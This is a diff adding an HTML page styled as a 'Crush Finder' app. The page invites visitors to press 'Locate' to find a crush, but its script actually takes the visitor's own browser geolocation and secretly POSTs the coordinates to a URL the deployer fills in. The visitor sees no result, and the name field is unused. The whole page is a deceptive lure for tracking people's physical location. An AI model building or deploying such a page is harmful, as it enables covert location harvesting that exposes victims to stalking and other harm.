@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Crush Finder</title>
+<style>
+	body,html {
+    height: 100%;
+}
+</style>
+<!-- CSS only -->
+<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+
+<!-- JS, Popper.js, and jQuery -->
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js" integrity="sha384-OgVRvuATP1z7JjHLkuOU7Xw704+h835Lr+6QL9UvYjZE3Ipu6Tp75j7Bh/kR0JKI" crossorigin="anonymous"></script>
+<script>
+    // Set up global variable
+    var result;
+
+	function sendRequest(lat, lon) {
+		var xhr = new XMLHttpRequest();
+		var yourUrl = '';
+		var data = 'latitude='+lat+'&longitude='+lon
+		xhr.open("POST", yourUrl, true);
+		xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+		xhr.onload = function () {
+    // do something to response
+    	console.log(this.responseText);
+		};
+		xhr.send(data);
+	}
+    
+    function showPosition() {
+        // Store the element where the page displays the result
+        result = document.getElementById("result");
+        
+        // If geolocation is available, try to get the visitor's position
+        if(navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
+        } else {
+            alert("Sorry, your browser does not support HTML5 geolocation.");
+        }
+    };
+    
+    // Define callback function for successful attempt
+    function successCallback(position) {
+		var lat = position.coords.latitude;
+		var lon = position.coords.longitude;
+        sendRequest(lat, lon);
+	}
+    
+    // Define callback function for failed attempt
+    function errorCallback(error) {
+        if(error.code == 1) {
+            result.innerHTML = "You've decided not to share your position";
+        } else if(error.code == 2) {
+            result.innerHTML = "The network is down or the positioning service can't be reached.";
+        } else if(error.code == 3) {
+            result.innerHTML = "The attempt timed out before it could get the location data.";
+        } else {
+            result.innerHTML = "Geolocation failed due to unknown error.";
+        }
+    }
+</script>
+</head>
+
+
+
+<body>
+    <div id="result">
+        <!--Position information will be inserted here-->
+	</div>
+
+	<div class="d-flex align-items-center flex-column justify-content-center h-100 bg-dark text-white" id="header">
+		<h1 class="display-4">Crush Locater</h1>
+		<form>
+			<div class="form-group">
+				<input class="form-control form-control-lg" placeholder="Your Name" type="text">
+			</div>
+			<div class="form-group">
+				<button type="button" onclick="showPosition();" class="btn btn-info btn-lg btn-block">Locate</button>
+			</div>
+		</form>
+	</div>
+	<div class="container" id="content">
+		<div class="row h-100 mt-5">
+			<main class="col-md-6">
+				<h1>Content...</h1>
+			</main>
+		</div>
+	</div>
+   
+</body>
+</html>                            
